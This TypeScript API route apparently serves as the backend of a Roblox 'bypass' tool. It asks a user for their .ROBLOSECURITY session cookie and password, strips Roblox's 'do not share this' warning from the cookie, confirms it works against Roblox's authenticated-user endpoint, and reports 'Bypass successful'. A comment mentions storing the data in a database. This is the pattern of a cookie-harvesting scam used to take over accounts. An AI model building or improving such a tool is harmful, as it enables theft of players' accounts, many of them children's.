export async function POST(request: Request) {
  try {
    const { cookie, password } = await request.json()
    console.log("[v0] Received bypass request")

    if (!cookie || !password) {
      return Response.json(
        {
          success: false,
          error: "Cookie and password are required",
        },
        { status: 400 },
      )
    }

    let cookieValue = cookie.trim()

    // Format 1: _|WARNING:-DO-NOT-SHARE-THIS...|_[COOKIE]
    if (cookieValue.includes("_|WARNING:") || cookieValue.includes("_|WARNING-")) {
      const parts = cookieValue.split("|_")
      if (parts.length >= 2) {
        cookieValue = parts[parts.length - 1]
      }
    }

    // Remove .ROBLOSECURITY= prefix if present
    if (cookieValue.startsWith(".ROBLOSECURITY=")) {
      cookieValue = cookieValue.substring(".ROBLOSECURITY=".length)
    }

    cookieValue = cookieValue.replace(/\s+/g, "")
    const formattedCookie = `.ROBLOSECURITY=${cookieValue}`

    try {
      console.log("[v0] Attempting to get user info with provided cookie...")
      const userResponse = await fetch("https://users.roblox.com/v1/users/authenticated", {
        method: "GET",
        headers: {
          Cookie: formattedCookie,
        },
      })

      console.log("[v0] User response status:", userResponse.status)

      if (!userResponse.ok) {
        console.log("[v0] Failed to authenticate with cookie")
        return Response.json(
          {
            success: false,
            error: "Invalid cookie. Authentication failed.",
          },
          { status: 401 },
        )
      }

      const userInfo = await userResponse.json()
      console.log("[v0] User authenticated:", userInfo.name)

      // Get user avatar
      const avatarUrl = `https://www.roblox.com/headshot-thumbnail/image?userId=${userInfo.id}&width=150&height=150&format=png`

      // Store bypass info in memory (in production, use database)
      return Response.json({
        success: true,
        userInfo: {
          id: userInfo.id,
          name: userInfo.name,
        },
        avatarUrl: avatarUrl,
        message: "Bypass successful",
      })
    } catch (error) {
      console.error("[v0] Error during bypass:", error)
      return Response.json(
        {
          success: false,
          error: "Failed to process bypass request",
        },
        { status: 500 },
      )
    }
  } catch (error) {
    console.error("[v0] Bypass error:", error)
    return Response.json(
      {
        success: false,
        error: "Failed to process request",
      },
      { status: 500 },
    )
  }
}
